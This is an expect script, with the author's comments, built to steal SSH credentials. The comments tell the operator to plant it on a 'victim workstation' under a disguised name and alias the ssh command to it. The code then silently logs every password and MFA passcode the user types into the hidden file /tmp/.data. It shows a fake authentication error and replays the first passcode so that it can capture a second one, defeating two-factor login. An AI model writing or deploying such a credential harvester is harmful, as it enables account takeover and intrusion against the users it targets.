#!/usr/bin/expect 

# Steps:
#
# Copy this file and ssh_stump.sh to victim workstation, renamed to something less obvious
# On victim workstation run alias ssh="/path/to/this/file.expect 2>/dev/null"
#     (the stderr redirect prevents a 10-line error message when the user exits ssh)
# Ensure your alias links to the correct path for this file

# Things to improve:
#
# - 2nd passcode has "key" cursor with no echo for ~2 seconds, then passcode1 spit out in one swoop
# - can it handle stealing passphrases?

# CURRENT:
# interactive works, yay!
# options work (like ssh -v, -l, user@host), yay!
# Works if user gives wrong password either time
# We get a list of all systems user SSH's to, so if they hit up git.dev, say, that might be useful to know
#     we could then add to this script to ask for a passphrase

set logfile /tmp/.data
set timeout 40
set arg1 [lindex $argv 0];
set arg2 [lindex $argv 1];
set arg3 [lindex $argv 2];
set user [exec whoami]
set date [exec date]
set host [exec hostname]
set logpath $logfile

log_file $logfile
send_log "\n\n$date\n"
send_log "ssh $arg1 $arg2 $arg3\n"
send_log "user = $user\n"
log_file

set server "$arg1 $arg2 $arg3"

spawn -noecho ~/ssh_stump.sh $user $server $host $logpath $arg1 $arg2 $arg3 

expect "Password:*" 
    stty -echo
    expect_user -timeout 3600 -re "(.*)\[\r\n]"
    stty echo
    send "$expect_out(1,string)\r" 
    set password $expect_out(1,string)
    log_file $logfile
    send_log "1st password prompt = $password\n"
    log_file
expect {
    "Password:*" {
        stty -echo
        expect_user -timeout 3600 -re "(.*)\[\r\n]"
        stty echo
        send "$expect_out(1,string)\r"
        set password $expect_out(1,string)
        log_file $logfile
        send_log "1st password prompt again = $password\n"
        log_file
        exp_continue }
    "Passcode:*" {
        expect_user -timeout 3600 -re "(.*)\[\r\n]"
        set passcode1 $expect_out(1,string)
        # We have to send something, so let's just send an empty line
        send "\r"
        sleep 2
        send_user "\nAuthentication error, please try again." }
}
expect "Password:*"
    stty -echo
    expect_user -timeout 3600 -re "(.*)\[\r\n]"
    stty echo
    send "$expect_out(1,string)\r"
    set password $expect_out(1,string)
    log_file $logfile
    send_log "2nd password prompt = $password\n"
    log_file
expect {
    "Password:*" {
        stty -echo
        expect_user -timeout 3600 -re "(.*)\[\r\n]"
        stty echo
        send "$expect_out(1,string)\r"
        set password $expect_out(1,string)
        log_file $logfile
        send_log "2nd password prompt again = $password\n"
        log_file 
        exp_continue }
    "Passcode:*" {
        stty -echo
        expect_user -timeout 3600 -re "(.*)\[\r\n]"
        set passcode2 $expect_out(1,string)
        stty echo
        send "$passcode1\r"
        log_file $logfile
        send_log "2nd passcode = $passcode2\n"
        log_file }
}

interact

# this interact works only if I run the script like
# expect -f ./ssh_snoop2.expect (with bastion hardcoded)
# Ahhh - expect script version 1 worked because .sh used instead of stdin
